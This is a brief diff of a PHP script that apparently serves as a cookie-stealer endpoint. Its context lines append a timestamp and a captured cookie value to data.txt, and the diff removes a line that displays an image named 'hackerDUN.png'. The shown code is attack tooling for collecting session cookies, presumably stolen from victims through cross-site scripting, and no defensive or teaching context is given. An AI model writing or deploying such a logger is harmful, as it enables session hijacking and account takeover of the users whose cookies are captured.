@@ -4,5 +4,4 @@
 	$log=fopen("data.txt","a");
 	fwrite($log, $atime." ".$cookie."\r\n");
 	fclose($log);
-	echo "<img src=hackerDUN.png></img>";
 ?>
